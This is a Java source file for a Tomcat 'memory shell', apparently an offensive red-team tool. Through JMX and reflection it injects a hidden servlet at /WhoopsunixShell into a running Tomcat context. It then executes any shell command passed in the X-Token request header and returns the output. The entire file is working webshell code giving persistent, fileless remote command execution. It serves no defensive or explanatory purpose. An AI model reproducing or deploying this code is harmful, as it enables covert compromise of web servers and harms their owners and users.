package com.demo.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Set;

/**
 * @author Whoopsunix
 * JMX 注入 Tomcat Servlet 型内存马
 * Tomcat 7 8 9
 */
public class TSMSJMX implements Servlet {

    final private static String NAME = "Whoopsunix";
    final private static String pattern = "/WhoopsunixShell";

    public TSMSJMX() {

    }

    static {
        try {
            javax.management.MBeanServer mbeanServer = ManagementFactory.getPlatformMBeanServer();
//            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (com.sun.jmx.interceptor.DefaultMBeanServerInterceptor) getFieldValue(mbeanServer, "mbsInterceptor");
            com.sun.jmx.mbeanserver.Repository repository = (com.sun.jmx.mbeanserver.Repository) getFieldValue(defaultMBeanServerInterceptor, "repository");
            Set<com.sun.jmx.mbeanserver.NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot 中是 Tomcat
                objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (com.sun.jmx.mbeanserver.NamedObject namedObject : objectSet) {
                javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");

                // wrapper 封装
                if (standardContext.findChild(NAME) == null) {
                    org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
                    wrapper.setName(NAME);
                    Servlet servlet = new TSMSJMX();
                    wrapper.setServletClass(servlet.getClass().getName());
                    wrapper.setServlet(servlet);
                    // 添加到 standardContext
                    standardContext.addChild(wrapper);


                    try{
                        // M1 Servlet映射到URL模式
                        // standardContext.addServletMapping(pattern,NAME);
                        Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
                        addServletMappingMethod.setAccessible(true);
                        addServletMappingMethod.invoke(standardContext, pattern, NAME);
                    } catch (NoSuchMethodException e) {
                        // M2 Servlet3 新特性 Dynamic
//                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
//                        registration.addMapping(pattern);
                        Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
                    }

                }
            }

        } catch (Exception e) {
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println("TSMSJMX injected");
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
